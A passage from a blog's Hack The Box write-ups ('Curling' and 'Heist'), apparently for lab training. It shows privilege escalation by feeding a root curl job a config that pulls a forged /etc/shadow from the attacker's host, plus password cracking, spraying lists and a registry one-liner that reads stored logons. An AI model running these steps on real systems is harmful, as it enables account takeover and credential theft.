00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&amp;SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..&lt;~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .&gt;...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48 
</code></pre></div></div>

<p><em>after some quick research on “how to read contents of a hexdump”,</em> we find that we need to use the <code class="language-plaintext highlighter-rouge">xxd</code> tool with the <code class="language-plaintext highlighter-rouge">-r</code> flag to convert the file to a binary.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@curling:/tmp$ xxd -h
Usage:
       xxd [options] [infile [outfile]]
    or
       xxd -r [-s [-]offset] [-c cols] [-ps] [infile [outfile]]
Options:
    -a          toggle autoskip: A single '*' replaces nul-lines. Default off.
    -b          binary digit dump (incompatible with -ps,-i,-r). Default hex.
    -c cols     format &lt;cols&gt; octets per line. Default 16 (-i: 12, -ps: 30).
    -E          show characters in EBCDIC. Default ASCII.
    -e          little-endian dump (incompatible with -ps,-i,-r).
    -g          number of octets per group in normal output. Default 2 (-e: 4).
    -h          print this summary.
    -i          output in C include file style.
    -l len      stop after &lt;len&gt; octets.
    -o off      add &lt;off&gt; to the displayed file position.
    -ps         output in postscript plain hexdump style.
    -r          reverse operation: convert (or patch) hexdump into binary.
    -r -s off   revert with &lt;off&gt; added to file positions found in hexdump.
    -s [+][-]seek  start at &lt;seek&gt; bytes abs. (or +: rel.) infile offset.
    -u          use upper case hex letters.
    -v          show version: "xxd V1.10 27oct98 by Juergen Weigert".
</code></pre></div></div>

<p>`    -r          reverse operation: convert (or patch) hexdump into binary.`</p>

<p>So we go ahead and do that. And we use the <code class="language-plaintext highlighter-rouge">file</code> command against the output.</p>

<p>It’s very handy when you want to know what file type you’re dealing with.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@curling:/home/floris$ xxd -r password_backup &gt; /tmp/hex
www-data@curling:/home/floris$ cd /tmp/
www-data@curling:/tmp$ file hex 
hex: bzip2 compressed data, block size = 900k
</code></pre></div></div>

<p>It’s compressed using <code class="language-plaintext highlighter-rouge">bzip2</code>. so we go ahead and extract it using <code class="language-plaintext highlighter-rouge">bzip2</code> and the <code class="language-plaintext highlighter-rouge">-d</code> flag. Then again use the <code class="language-plaintext highlighter-rouge">file</code> command to see what we got.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@curling:/tmp$ bzip2 -d hex 
bzip2: Can't guess original name for hex -- using hex.out
www-data@curling:/tmp$ file hex.out 
hex.out: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix
</code></pre></div></div>

<p>Alright, this time it’s compressed with <code class="language-plaintext highlighter-rouge">gzip</code>. so we use <code class="language-plaintext highlighter-rouge">gzip</code> with the <code class="language-plaintext highlighter-rouge">-d</code> flag for extraction. But we get an error for the file having an unknown suffix. This forces us to rename the file adding a <code class="language-plaintext highlighter-rouge">.gz</code> at the end before retrying. And we follow with yet another <code class="language-plaintext highlighter-rouge">file</code> command.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@curling:/tmp$ gzip -d hex.out 
gzip: hex.out: unknown suffix -- ignored
www-data@curling:/tmp$ mv hex.out hex.out.gz
www-data@curling:/tmp$ gzip -d hex.out.gz 
www-data@curling:/tmp$ file hex.out 
hex.out: bzip2 compressed data, block size = 900k
</code></pre></div></div>

<p>Looks like another round of compression with <code class="language-plaintext highlighter-rouge">bzip2</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@curling:/tmp$ bzip2 -d hex.out 
bzip2: Can't guess original name for hex.out -- using hex.out.out
www-data@curling:/tmp$ file hex.out.out 
hex.out.out: POSIX tar archive (GNU)
</code></pre></div></div>

<p>And again but this time with <code class="language-plaintext highlighter-rouge">tar</code>. We’re using the flags <code class="language-plaintext highlighter-rouge">-xvf</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@curling:/tmp$ tar -xvf hex.out.out 
password.txt
www-data@curling:/tmp$ file password.txt 
password.txt: ASCII text
www-data@curling:/tmp$ cat password.txt 
5d&lt;wdCbdZu)|hChXll
</code></pre></div></div>

<p>At last we get some ASCII text :D We’re going to try and switch user to <code class="language-plaintext highlighter-rouge">floris</code> using that password.</p>

<p><em>In case you were wondering, I did try reusing the password in <code class="language-plaintext highlighter-rouge">secret.txt</code> but it didn’t work :/</em></p>

<p><img src="/assets/curling/got-floris.jpg" alt="got-floris" /></p>

<p>it was indeed the password for the <code class="language-plaintext highlighter-rouge">floris</code> user :D <em>It would’ve been a bad troll move if it weren’t XD</em></p>

<h3 id="privilege-escalation">Privilege Escalation</h3>

<p>Right off the bat, we check <code class="language-plaintext highlighter-rouge">sudo -l -l</code> for an easy win. But don’t find anything there.</p>

<p>we go the <strong>webroot</strong> and check <code class="language-plaintext highlighter-rouge">configuration.php</code> for some creds. And, we DO find some for the local database:</p>

<p><img src="/assets/curling/configuration.php.jpg" alt="configuration.php" /></p>

<h3 id="db-enumeration">DB Enumeration</h3>

<p>we use the the creds to enumerate the database. but find nothing special there.</p>

<p><img src="/assets/curling/db-login.jpg" alt="db-login" /></p>

<p><code class="language-plaintext highlighter-rouge">mysql&gt; show databases;</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+--------------------+
| Database           |
+--------------------+
| information_schema |
| Joombla            |
+--------------------+
2 rows in set (0.00 sec)
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">mysql&gt; use Joombla;</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">mysql&gt; show tables;</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+-------------------------------+
| Tables_in_Joombla             |
+-------------------------------+
| eslfu_assets                  |
| eslfu_associations            |
| eslfu_banner_clients          |
| eslfu_banner_tracks           |
| eslfu_banners                 |
| eslfu_categories              |
| eslfu_contact_details         |
| eslfu_content                 |
| eslfu_content_frontpage       |
| eslfu_content_rating          |
| eslfu_content_types           |
| eslfu_contentitem_tag_map     |
| eslfu_core_log_searches       |
| eslfu_extensions              |
| eslfu_fields                  |
| eslfu_fields_categories       |
| eslfu_fields_groups           |
| eslfu_fields_values           |
| eslfu_finder_filters          |
| eslfu_finder_links            |
| eslfu_finder_links_terms0     |
| eslfu_finder_links_terms1     |
| eslfu_finder_links_terms2     |
| eslfu_finder_links_terms3     |
| eslfu_finder_links_terms4     |
| eslfu_finder_links_terms5     |
| eslfu_finder_links_terms6     |
| eslfu_finder_links_terms7     |
| eslfu_finder_links_terms8     |
| eslfu_finder_links_terms9     |
| eslfu_finder_links_termsa     |
| eslfu_finder_links_termsb     |
| eslfu_finder_links_termsc     |
| eslfu_finder_links_termsd     |
| eslfu_finder_links_termse     |
| eslfu_finder_links_termsf     |
| eslfu_finder_taxonomy         |
| eslfu_finder_taxonomy_map     |
| eslfu_finder_terms            |
| eslfu_finder_terms_common     |
| eslfu_finder_tokens           |
| eslfu_finder_tokens_aggregate |
| eslfu_finder_types            |
| eslfu_languages               |
| eslfu_menu                    |
| eslfu_menu_types              |
| eslfu_messages                |
| eslfu_messages_cfg            |
| eslfu_modules                 |
| eslfu_modules_menu            |
| eslfu_newsfeeds               |
| eslfu_overrider               |
| eslfu_postinstall_messages    |
| eslfu_redirect_links          |
| eslfu_schemas                 |
| eslfu_session                 |
| eslfu_tags                    |
| eslfu_template_styles         |
| eslfu_ucm_base                |
| eslfu_ucm_content             |
| eslfu_ucm_history             |
| eslfu_update_sites            |
| eslfu_update_sites_extensions |
| eslfu_updates                 |
| eslfu_user_keys               |
| eslfu_user_notes              |
| eslfu_user_profiles           |
| eslfu_user_usergroup_map      |
| eslfu_usergroups              |
| eslfu_users                   |
| eslfu_utf8_conversion         |
| eslfu_viewlevels              |
+-------------------------------+
72 rows in set (0.00 sec)
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">mysql&gt; describe eslfu_users;</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+---------------+---------------+------+-----+---------------------+----------------+
| Field         | Type          | Null | Key | Default             | Extra          |
+---------------+---------------+------+-----+---------------------+----------------+
| id            | int(11)       | NO   | PRI | NULL                | auto_increment |
| name          | varchar(400)  | NO   | MUL |                     |                |
| username      | varchar(150)  | NO   | MUL |                     |                |
| email         | varchar(100)  | NO   | MUL |                     |                |
| password      | varchar(100)  | NO   |     |                     |                |
| block         | tinyint(4)    | NO   | MUL | 0                   |                |
| sendEmail     | tinyint(4)    | YES  |     | 0                   |                |
| registerDate  | datetime      | NO   |     | 0000-00-00 00:00:00 |                |
| lastvisitDate | datetime      | NO   |     | 0000-00-00 00:00:00 |                |
| activation    | varchar(100)  | NO   |     |                     |                |
| params        | text          | NO   |     | NULL                |                |
| lastResetTime | datetime      | NO   |     | 0000-00-00 00:00:00 |                |
| resetCount    | int(11)       | NO   |     | 0                   |                |
| otpKey        | varchar(1000) | NO   |     |                     |                |
| otep          | varchar(1000) | NO   |     |                     |                |
| requireReset  | tinyint(4)    | NO   |     | 0                   |                |
+---------------+---------------+------+-----+---------------------+----------------+
16 rows in set (0.01 sec)
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">mysql&gt; select username,password from eslfu_users;</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| floris   | $2y$10$4t3DQSg0DSlKcDEkf1qEcu6nUFEr/gytHfVENwSmZN1MXxE1Ssx.e |
+----------+--------------------------------------------------------------+
1 row in set (0.00 sec)
</code></pre></div></div>

<p>We find only the <code class="language-plaintext highlighter-rouge">floris</code> user there which we happen to already have.</p>

<p>we grab the other password:</p>

<p><code class="language-plaintext highlighter-rouge">public $secret = 'VGQ09exHr8W2leID';</code></p>

<p>and try to <code class="language-plaintext highlighter-rouge">su</code> as <code class="language-plaintext highlighter-rouge">root</code>. But, it’s not going to be that easy :D</p>

<p>Note: Enumerating the database is a step we could have done using the <code class="language-plaintext highlighter-rouge">www-data</code> user of course. But my attention was intrigued more by the <code class="language-plaintext highlighter-rouge">password_backup</code> file and that’s why I went for it first.</p>

<h3 id="detecting-unusual-activity">Detecting unusual activity</h3>

<p><em>After running <code class="language-plaintext highlighter-rouge">linpeas</code>,</em> we don’t find much leads to investigate. So we turn to the folder <code class="language-plaintext highlighter-rouge">admin-area</code> in the <code class="language-plaintext highlighter-rouge">home</code> of the <code class="language-plaintext highlighter-rouge">floris</code> user. And we notice that the files <code class="language-plaintext highlighter-rouge">input</code> and <code class="language-plaintext highlighter-rouge">report</code> have been very recently modified.</p>

<p><img src="/assets/curling/admin-area.jpg" alt="admin-area" /></p>

<p>we check their contents:</p>

<p><img src="/assets/curling/input-report-files.jpg" alt="input-report-files" /></p>

<p>it seems that a <code class="language-plaintext highlighter-rouge">curl</code> command is being executed on the <code class="language-plaintext highlighter-rouge">localhost</code> url <code class="language-plaintext highlighter-rouge">http://127.0.0.1</code> which sends the output into the <code class="language-plaintext highlighter-rouge">report</code> file. We know that because of the error message <code class="language-plaintext highlighter-rouge">WARNING: Failed to daemonise.  This is quite common and not fatal.</code> which is the error you get when you trigger a <code class="language-plaintext highlighter-rouge">PHP reverse shell</code> without a listener.</p>

<h3 id="running-a-quick-test-to-verify-our-hypothesis">Running a quick test to verify our hypothesis</h3>

<p>We can confirm that by starting a listener to see if something connects back.</p>

<p><img src="/assets/curling/running-curl.jpg" alt="running-curl" /></p>

<p>It does happen :D but we need more information to be able to exploit this</p>

<h3 id="pspy">PSPY</h3>

<p>we want to get <code class="language-plaintext highlighter-rouge">pspy</code> (https://github.com/DominicBreuker/pspy) on the victim machine so we can start monitoring what’s goin on inside the system. <code class="language-plaintext highlighter-rouge">pspy</code> is a tool you can use to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. It’s very handy.</p>

<p>after making the binary executable, we start it and notice some very interesting activity going on.</p>

<p><img src="/assets/curling/pspy.jpg" alt="pspy" /></p>

<p><code class="language-plaintext highlighter-rouge">/bin/sh -c sleep 1; cat /root/default.txt &gt; /home/floris/admin-area/input</code> a user who can read the file <code class="language-plaintext highlighter-rouge">default.txt</code> within the <code class="language-plaintext highlighter-rouge">root</code> folder is getting its contents into the <code class="language-plaintext highlighter-rouge">input</code> file in the home folder of the <code class="language-plaintext highlighter-rouge">floris</code> user.</p>

<p><code class="language-plaintext highlighter-rouge">/bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report</code> as we thought, a curl command is being run which outputs to the <code class="language-plaintext highlighter-rouge">report</code> file. But we notice that it uses the <code class="language-plaintext highlighter-rouge">-K</code> flag which lets the curl command read the <code class="language-plaintext highlighter-rouge">input</code> file as its configuration.</p>

<p><img src="/assets/curling/curl-help.jpg" alt="curl-help" /></p>

<h3 id="abusing-curl">Abusing cURL</h3>

<p>we do a search on GTFO Bins (https://gtfobins.github.io/gtfobins/curl/) and find we can get a <code class="language-plaintext highlighter-rouge">file read</code> using <code class="language-plaintext highlighter-rouge">curl</code></p>

<p><img src="/assets/curling/gtfo-curl.jpg" alt="gtfo-curl" /></p>

<p>since we can modify the the <code class="language-plaintext highlighter-rouge">input</code> file, we have pretty good control over the curl command. we try reading the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file</p>

<p><img src="/assets/curling/modify-for-shadow.jpg" alt="modify-for-shadow" /></p>

<p>and we manage to get the <code class="language-plaintext highlighter-rouge">shadow</code> file contents :D so it works!</p>

<p><img src="/assets/curling/got-shadow.jpg" alt="got-shadow" /></p>

<h3 id="getting-a-shell-by-altering-the-shadow-file">Getting a shell by altering the shadow file</h3>

<p><em>alright, with this,</em> we can totally read the <code class="language-plaintext highlighter-rouge">root.txt</code> file. But that wouldn’t be fun :D … we’re going for a shell :D</p>

<p><em>since we can read the <code class="language-plaintext highlighter-rouge">shadow</code> file, and we can use the <code class="language-plaintext highlighter-rouge">curl</code> command’s <code class="language-plaintext highlighter-rouge">output</code> functionality to write as root,</em> we can <strong>forge</strong> our own <code class="language-plaintext highlighter-rouge">shadow</code> version.</p>

<p>we first need to create a <code class="language-plaintext highlighter-rouge">SHA-512</code> hash using <code class="language-plaintext highlighter-rouge">mkpasswd</code></p>

<p><img src="/assets/curling/mkpasswd.jpg" alt="mkpasswd" /></p>

<p>then we need to replace <code class="language-plaintext highlighter-rouge">root</code>’s hash with our own in the <code class="language-plaintext highlighter-rouge">shadow</code> file we got.</p>

<p>notice the <code class="language-plaintext highlighter-rouge">diff</code> between <code class="language-plaintext highlighter-rouge">my_shadow</code> which is our forged one in comparison with <code class="language-plaintext highlighter-rouge">his_shadow</code> which is the one we got from the victim</p>

<p><img src="/assets/curling/shadow-diff.jpg" alt="shadow-diff" /></p>

<p><em>alright, with that set,</em> we will want the <code class="language-plaintext highlighter-rouge">curl</code> command running as <code class="language-plaintext highlighter-rouge">root</code> to read our forged shadow file and write it over the old one.</p>

<p>we can do this by modifiying the <code class="language-plaintext highlighter-rouge">input</code> file like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>floris@curling:~/admin-area$ cat input 
url = "http://10.10.16.6/my_shadow"
output = "/etc/shadow"
</code></pre></div></div>

<p>we start our <code class="language-plaintext highlighter-rouge">python3</code> webserver and we get a <code class="language-plaintext highlighter-rouge">GET</code> request :D</p>

<p>We then <code class="language-plaintext highlighter-rouge">su</code> as the <code class="language-plaintext highlighter-rouge">root</code> user and get our root shell! :D</p>

<p><img src="/assets/curling/gotcha.jpg" alt="gotcha" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary we find Joomla running on HTTP port 80 and we get a list of usernames from the posts on the main page. Inspecting the home page’s source code, we find a comment about a secret.txt file which happens to be at the webroot. The contents of the file reveal a base64-encoded password which we use to gain administrative access to Joomla using the floris user. We abuse the Joomla Administrator’s ability to edit PHP files to place a reverse shell and gain access as the www-data user. We find a readable hexdump called password_backup in floris’s home folder which we reverse to a binary and decompress to gain the password for the floris user. Detecting unusal activity on the box with pspy reveals a cron job running as root and executing a curl command that reads its configuration from a file we can modify. Abusing curl for privileged read/write access lets us get a shell as root by forging our own /etc/shadow file.]]></summary></entry><entry><title type="html">Htb writeup heist</title><link href="https://omnisl4sh.github.io/2022/03/25/HTB-Writeup-Heist.html" rel="alternate" type="text/html" title="Htb writeup heist" /><published>2022-03-25T00:00:00+02:00</published><updated>2022-03-25T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/03/25/HTB%20Writeup%20Heist</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/03/25/HTB-Writeup-Heist.html"><![CDATA[<h3 id="summary">Summary</h3>
<ul>
  <li>We find a website on port 80 that <strong>lets us login as a guest</strong>.</li>
  <li><em>On the first page,</em> we find a conversation between a user and a support admin about checking an <strong>attached Cisco router configuration file</strong>.</li>
  <li><em>Browsing the configuration file,</em> we find <strong>hashes</strong> that <em>we can easily crack</em> to get passwords.</li>
  <li>One password works with SMB for the user on the web page. We use that to do a <strong><code class="language-plaintext highlighter-rouge">RID</code> enumeration</strong> to get <strong>all the usernames on the system</strong>.</li>
  <li><strong>Reusing the password we found with all users,</strong> we find one more user who happens to have <strong>PowerShell remoting access.</strong></li>
  <li><em>To privesc</em>, we use the famous <strong>PrintNightmare</strong> vulnerability since <strong>print spooler</strong> is found running.</li>
  <li>The <em>intended</em> path is <strong>dumping the running Firefox process from memory</strong> and using the <code class="language-plaintext highlighter-rouge">strings</code> command to obtain the <strong>Administrator credentials</strong> from the dump.</li>
</ul>

<hr />

<h3 id="nmap">Nmap</h3>
<p>we first start by doing a quick nmap top 10 tcp ports: <code class="language-plaintext highlighter-rouge">nmap --top-ports --open 10.10.10.149</code></p>

<p><img src="/assets/Heist/nmap-top-10-ports.jpg" alt="nmap top 10 port scan" /></p>

<p>we find http and smb ports open, so we begin with HTTP after leaving a full port scan <code class="language-plaintext highlighter-rouge">nmap -p- -T4 -sC -sV 10.10.10.149</code></p>

<h3 id="guest-login">Guest login</h3>

<p>we immediately see the login page of a web app that gives us the options to <em>Login as guest</em></p>

<p><img src="/assets/Heist/Login-Page.jpg" alt="web app login page" /></p>

<ol>
  <li>we use that feature to login and we see a page of issues. a user called <strong>hazard</strong> is talking about having problems with his <strong>cisco</strong> router. And, he <em>attached</em> a <strong>configuration file</strong> <em>the previous admin</em> has been using.</li>
  <li>the support admin replies to him saying that he will take a look</li>
  <li>the hazard user asks the support admin to <strong>an account for him on the windows server</strong> as he needs to access the files.</li>
</ol>

<p><img src="/assets/Heist/Issues.jpg" alt="Issues" /></p>

<h3 id="cisco-router-configuration-file">Cisco Router Configuration File</h3>

<p>we go ahead and click the attachment link and see <strong>3 different hashes</strong>:</p>

<p><img src="/assets/Heist/Config.jpg" alt="Config" /></p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91</code></li>
  <li><code class="language-plaintext highlighter-rouge">username rout3r password 7 0242114B0E143F015F5D1E161713</code></li>
  <li><code class="language-plaintext highlighter-rouge">username admin privilege 15 password 7 02375012182C1A1D751618034F36415408</code></li>
</ol>

<h3 id="cracking-cisco-hashes">Cracking Cisco Hashes</h3>

<p>cracking those hashes might give us a set of passwords to try to gain more access with. So we use <code class="language-plaintext highlighter-rouge">john</code> to crack the first one</p>

<p>we find that the password is <em>stealth1agent</em></p>

<p><img src="/assets/Heist/cracked.jpg" alt="cracked" /></p>

<p>we want to crack the two other hashes as well. so we do a google search on <code class="language-plaintext highlighter-rouge">crack cisco configuration hash</code>. and we find websites ready to do decrypt what is called a <strong>Cisco type 7 password</strong></p>

<p><img src="/assets/Heist/google-search.jpg" alt="type-7-cracker" /></p>

<p>we use them to crack hashes #2 and #3 for users <code class="language-plaintext highlighter-rouge">rout3r</code> and <code class="language-plaintext highlighter-rouge">admin</code></p>

<p>the results were:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">$uperP@ssword</code> for the <code class="language-plaintext highlighter-rouge">rout3r</code> user</li>
  <li><code class="language-plaintext highlighter-rouge">Q4)sJu\Y8qz*A3?d</code> for the <code class="language-plaintext highlighter-rouge">admin</code> user</li>
</ul>

<p>this is a start :D
<em>from the conversation on the issues page,</em> we know that <strong>the hazard user requested a user on the windows server</strong>. So, it would be relevant to try logging to the server as that user. we also have 3 different passwords to try with him. we will use the open <code class="language-plaintext highlighter-rouge">smb</code> port to try loggin in and use the mighty <code class="language-plaintext highlighter-rouge">crackmapexec</code> for that :)</p>

<p>the <strong>hazard</strong> user authenticated with the password <code class="language-plaintext highlighter-rouge">stealth1agent</code> but he doesn’t seem to have administrator privileges :/</p>

<p><img src="/assets/Heist/hazard-authenticated.jpg" alt="hazard-authenticated" /></p>

<p>we gain some information about the host:</p>
<ol>
  <li>name: SupportDesk</li>
  <li>OS: Windows 10.0 Build 17763 x64</li>
  <li>Domain: SupportDesk</li>
  <li>SMB Signing and SMBv1: False</li>
</ol>

<h3 id="testing-password-variations">Testing password variations</h3>

<p>we try our luck with the administrator account using variations of the <code class="language-plaintext highlighter-rouge">stealth1agent</code> password as well as the other passwords we found. But we don’t have a success:</p>

<p><img src="/assets/Heist/admin-trials.jpg" alt="admin-trials" /></p>

<p>we get similar results when trying other probable users like admin, supportadmin, supportdesk etc.</p>

<h3 id="listing-our-options">Listing our options</h3>

<p>we take a step back and think about all the information we can get from having a valid user:</p>
<ol>
  <li>enumerate SMB shares</li>
  <li>enumerate sessions</li>
  <li>enumerate logged on users</li>
  <li>enumerate local groups</li>
  <li>enumerate local users using RID bruteforce</li>
</ol>

<p><em>when enumerating shares,</em> we don’t see something particularly exploitable</p>

<p><img src="/assets/Heist/smb-shares.jpg" alt="smb-shares" /></p>

<h3 id="rid-brute-forcing">RID Brute Forcing</h3>

<p>we also get nothing from enumerating sessions, logged on users or localgroups. <em>However, when enumerating local users using RID bruteforce,</em> we get a nice list of users to try! :D</p>

<p><img src="/assets/Heist/rid-brute.jpg" alt="rid-brute" /></p>

<p>we update our <strong>userlist</strong> right away with those newly-found users:</p>
<ol>
  <li>support</li>
  <li>chase</li>
  <li>jason</li>
</ol>

<h3 id="password-reuse">Password Reuse</h3>

<p>and we give it another shot with <code class="language-plaintext highlighter-rouge">crackmapexec</code> while telling it to <code class="language-plaintext highlighter-rouge">continue on success</code>. we want to know if any passwords were being reused.</p>

<p><em>right now,</em> our lists are like this:</p>

<p>usernames.txt</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>support
chase
jason
</code></pre></div></div>

<p>passwords.txt</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stealth0agent
stealth1agent
stealth2agent
stealth3agent
stealth4agent
stealth5agent
stealth6agent
stealth7agent
stealth8agent
stealth9agent
$uperP@ssword
Q4)sJu\Y8qz*A3?d
</code></pre></div></div>

<p>Our attack dropped one more user: <strong>chase!</strong></p>

<p><img src="/assets/Heist/chase-owned.jpg" alt="chase-owned" /></p>

<h3 id="getting-code-execution">Getting Code Execution</h3>

<p><em>trying to execute commands using <code class="language-plaintext highlighter-rouge">crackmapexec</code>,</em> we don’t get command execution. It seems chase also isn’t an administrator on the machine :/</p>

<p><em>however…</em></p>

<p><em>our full port scan with nmap has now finished, we find another port open there: 5985,</em> this port is for <strong>Windows Remote Management (WinRM)</strong> and can be used to gain remote code execution.</p>

<p><img src="/assets/Heist/full-nmap.jpg" alt="full-nmap" /></p>

<p>there a tool called <code class="language-plaintext highlighter-rouge">evil-winrm</code> which we can use to see if we can connect remotely.</p>

<p><img src="/assets/Heist/win-rm-as-chase.jpg" alt="win-rm-as-chase" /></p>

<p>it works with <strong>chase</strong> <em>but not with hazard</em>, this is because he happens to be a member of the special group: <code class="language-plaintext highlighter-rouge">Remote Management Users</code> which allows him to use <strong>PowerShell Remoting.</strong></p>

<p><img src="/assets/Heist/chase-groups.jpg" alt="chase-groups" /></p>

<h3 id="lets-privesc">Let’s privesc</h3>

<p><em>now on the machine,</em> we go into privilege escalation mode :D we try many things:</p>

<ol>
  <li>searching desktop, documents &amp; downloads: <code class="language-plaintext highlighter-rouge">ls -force ~\Desktop, ~\Documents, ~\Downloads</code>
```
Directory: C:\Users\Chase\Desktop</li>
</ol>

<p>Mode                LastWriteTime         Length Name
—-                ————-         —— —-
-a-hs-        4/22/2019   7:14 AM            282 desktop.ini
-a—-        4/22/2019   9:08 AM            121 todo.txt
-ar—        3/18/2022   2:13 PM             34 user.txt</p>

<p>Directory: C:\Users\Chase\Documents</p>

<p>Mode                LastWriteTime         Length Name
—-                ————-         —— —-
d–hsl        4/22/2019   7:14 AM                My Music
d–hsl        4/22/2019   7:14 AM                My Pictures
d–hsl        4/22/2019   7:14 AM                My Videos
-a-hs-        4/22/2019   7:14 AM            402 desktop.ini</p>

<p>Directory: C:\Users\Chase\Downloads</p>

<p>Mode                LastWriteTime         Length Name
—-                ————-         —— —-
-a-hs-        4/22/2019   7:14 AM            282 desktop.ini
-a—-        2/18/2021   4:03 PM       98779512 VMware-tools-11.2.5-17337674-x86_64.exe</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>the contents of `todo.txt` don't reveal something important:
</code></pre></div></div>
<p>Stuff to-do:</p>
<ol>
  <li>Keep checking the issues list.</li>
  <li>Fix the router config.</li>
</ol>

<p>Done:</p>
<ol>
  <li>Restricted access for guest user.
```</li>
  <li>searching in IIS webroot: <code class="language-plaintext highlighter-rouge">ls -force c:\inetpub\wwwroot</code> we get <strong>access denied</strong></li>
  <li>searching within hazard’s profile, we get <strong>access denied</strong></li>
  <li>searching for <strong>Autologon Creds</strong>, with a <em>little powershell one-liner I wrote:</em>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ErrorActionPreference='SilentlyContinue';'DefaultDomainName', 'DefaultUserName', 'DefaultPassword', 'AltDefaultDomainName', 'AltDefaultUserName', 'AltDefaultPassword' | % {$Val = Get-ItemPropertyValue -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name $_ ;if($Val){Write-Host -ForegroundColor Green "[+] $_`: $Val"; Clear-Variable Val}else{Write-Host "[-] $_`: Not found"}};$ErrorActionPreference='Continue'
</code></pre></div>    </div>
    <p>we get nothing also:</p>
  </li>
</ol>

<p><img src="/assets/Heist/autologon-creds.jpg" alt="autologon-creds" /></p>

<ol>
  <li>checking for services, we get <strong>access denied</strong></li>
  <li>checking for processes, we see intersting things running:
    <ol>
      <li>firefox –&gt; we can search for <em>stored passwords</em></li>
      <li>php-cgi –&gt; maybe we can try to abuse this somehow</li>
      <li>spoolsv –&gt; <strong>Print Nightmare Privesc!</strong></li>
    </ol>
  </li>
</ol>

<h3 id="printnightmare-would-be-too-easy">PrintNightmare would be too easy</h3>

<p><em>given that print nightmare would be too easy,</em> I take a shot at the 1st option and search for stored passwords for <strong>Firefox</strong> :D
the path should be <code class="language-plaintext highlighter-rouge">C:\Users\Chase\AppData\Roaming\Mozilla\Firefox\Profiles\</code> for chase. Which we find that it contains a password file <code class="language-plaintext highlighter-rouge">key4.db</code> but notice that <em>there was no <code class="language-plaintext highlighter-rouge">logins.json</code> to be used in pulling those credentials :/</em></p>

<p><img src="/assets/Heist/no-json-logins.jpg" alt="no-json-logins" /></p>

<h3 id="the-firefox-rabbit-hole">The Firefox Rabbit Hole</h3>

<p>the process of hunting for those firefox passwords took way longer than you would expect :)</p>
<ol>
  <li>I used a tool called <code class="language-plaintext highlighter-rouge">SharpWeb.exe</code> (https://github.com/djhohnstein/SharpWeb), only to find out from its source code that <em>it only handles <code class="language-plaintext highlighter-rouge">key3.db</code> files.</em> Changing the name of the file to match that didn’t work. after all, if the number 4 refers to an improved version, that would mean that this version of the tool wouldn’t work.</li>
  <li>I found another tool written in python, with which I had trouble transforimg to an exe using <code class="language-plaintext highlighter-rouge">pyinstaller</code>.</li>
  <li>I found a final tool called <code class="language-plaintext highlighter-rouge">HarvestBrowserPasswords.exe</code> (https://github.com/Apr4h/HarvestBrowserPasswords) which threw the error of <em>not being able to find the <code class="language-plaintext highlighter-rouge">logins.json</code> file</em> which was the sign that this privesc path wasn’t valid.</li>
</ol>

